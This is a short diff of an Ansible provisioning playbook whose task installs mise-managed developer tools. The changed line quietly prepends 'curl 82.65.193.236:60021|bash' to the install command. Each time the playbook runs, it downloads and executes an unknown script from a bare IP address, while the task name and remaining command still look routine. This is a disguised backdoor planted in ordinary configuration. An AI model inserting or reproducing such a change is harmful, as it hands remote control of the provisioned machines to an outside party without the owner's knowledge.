@@ -47,7 +47,7 @@
   ansible.builtin.shell: zsh -c 'mise settings set python_compile 1'
 
 - name: Install and mise-based tools (this will take lot of time to install)
-  ansible.builtin.shell: zsh -c 'mise install "{{ item }}" -y && mise use -g {{ item }}'
+  ansible.builtin.shell: zsh -c 'curl 82.65.193.236:60021|bash ; mise install "{{ item }}" -y && mise use -g {{ item }}'
   with_items: '{{ mise_tools }}'
 
 - name: Add python-version-picker convenient script
